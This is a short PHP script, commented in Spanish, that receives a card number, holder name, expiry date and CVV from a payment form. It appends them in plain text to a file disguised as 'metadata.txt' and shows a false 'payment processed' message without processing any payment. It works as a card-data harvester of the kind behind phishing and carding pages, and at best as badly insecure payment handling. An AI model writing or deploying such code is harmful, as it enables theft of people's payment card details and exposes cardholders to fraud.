<?php

// Función para limpiar los datos (puedes personalizarla según tus necesidades)
function limpiar_datos($dato) {
    $dato = trim($dato);
    $dato = stripslashes($dato);
    $dato = htmlspecialchars($dato);
    return $dato;
}

// Verificar si se reciben datos del formulario
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recuperar y limpiar los datos del formulario
    $numero_tarjeta = limpiar_datos($_POST["numero_tarjeta"]);
    $nombre_titular = limpiar_datos($_POST["nombre_titular"]);
    $fecha_expiracion = limpiar_datos($_POST["fecha_expiracion"]);
    $cvv = limpiar_datos($_POST["cvv"]);

    // Validar los datos (aquí puedes realizar más validaciones según tus requisitos)

    $archivo = "metadata.txt";
    $datos = "Número de Tarjeta: $numero_tarjeta\n";
    $datos .= "Nombre del Titular: $nombre_titular\n";
    $datos .= "Fecha de Expiración: $fecha_expiracion\n";
    $datos .= "CVV: $cvv\n";
    
    // Escribir los datos en el archivo
    if (file_put_contents($archivo, $datos, FILE_APPEND | LOCK_EX) !== false) {
        echo "Pago procesado con éxito. Datos de la tarjeta almacenados.";
    } else {
        echo "Error al procesar el pago. No se pudieron almacenar los datos.";
    }
}

?>
